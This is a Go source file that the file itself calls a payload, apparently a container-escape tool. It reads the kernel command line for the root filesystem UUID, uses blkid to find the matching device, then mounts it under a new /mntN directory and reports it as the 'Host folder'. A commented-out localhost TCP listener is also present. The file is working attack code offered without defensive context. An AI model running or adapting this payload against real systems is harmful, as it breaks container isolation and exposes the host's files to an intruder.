package main

import (
	"fmt"
	"github.com/LDCS/qslinux/blkid"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func handleRequest(conn net.Conn) {
	// Make a buffer to hold incoming data.
	buf := make([]byte, 1024)
	// Read the incoming connection into the buffer.
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	// Send a response back to person contacting us.
	conn.Write([]byte("Message received."))
	// Close the connection when you're done with it.
	conn.Close()
}

// Thisy paylod uses the BLKID library which won't work with Yaegi
func main(){
/*
	conn, _ := net.Listen("tcp", "127.0.0.1:1330")

	// Close the listener when the application closes.
	defer conn.Close()
	for {
		// Listen for an incoming connection.
		conn, err := conn.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go handleRequest(conn)
	}
*/
	dat, err := ioutil.ReadFile("/proc/cmdline")
	check(err)
	cmdline := string(dat)
	splittedCmdLine := strings.Split(cmdline, " ")

	var uuid string

	// extracting the UUID of the device
	for _, splitLine := range splittedCmdLine {
		if strings.HasPrefix(splitLine, "root=UUID"){
			uuid = splitLine[10:]
		}
	}

	// Getting the blkid map
	rmap := blkid.Blkid(false)
	var key string
	var result *blkid.Blkiddata

	// finding the matched UUID device
	for key, result = range rmap {
		if result.Uuid_ == uuid {
			fmt.Printf("Devname: %q\n", key)
			break
		}
	}

	/*
	fmt.Printf("Uuid_=%q\n", result.Uuid_)
	fmt.Printf("Uuidsub_=%q\n", result.Uuidsub_)
	fmt.Printf("Type_=%q\n", result.Type_)
	fmt.Printf("Label_=%q\n", result.Label_)
	fmt.Printf("Parttype_=%q\n", result.Parttype_)
	fmt.Printf("Partuuid_=%q\n", result.Partuuid_)
	fmt.Printf("Partlabel_ =%q\n", result.Partlabel_)
	*/

	// creating folder
	dirId := 0
	var dirPath string

	// consider writing to /tmp if there is no permissions to write under /
	for {
		dirPath = "/mnt" + strconv.Itoa(dirId)
		if _, err := os.Stat(dirPath); os.IsNotExist(err) {
			os.Mkdir(dirPath, os.ModeDir)
			break
		} else {
			dirId += 1
		}

	}

	// mounting
	if err := syscall.Mount(key, dirPath, result.Type_, 0, "w"); err != nil {
		log.Printf("Mount(\"%s\", \"%s\", \"%s\", 0, \"w\")\n",key, dirPath, result.Type_)
		log.Fatal(err)
	}

	fmt.Printf("[*] Mounted successfuly \"%s\" to \"%s\"", key, dirPath)
	fmt.Printf("[*] Host folder is in: \"%s\"", dirPath)
}